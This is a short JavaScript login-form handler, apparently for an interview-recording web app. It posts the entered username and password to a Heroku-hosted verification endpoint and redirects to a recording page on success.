document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault(); // Prevent form submission
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;
    var id = document.getElementById("id").value;

    const url = 'https://interview-hirevue-ae9c2f5fd450.herokuapp.com/verify';

    // verify username and password
    fetch(url, {
        method: 'POST',
        body: JSON.stringify({ 'login': username, 'password': password}),
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(response => response.json())
    .then(data => {
        if (data.message == "success") {
            window.location.href = `record.html?id=${id}`;
        } else {
            alert('Invalid username or password');
        }
    })
    .catch(error => {
        console.error('Error:', error);
    });

});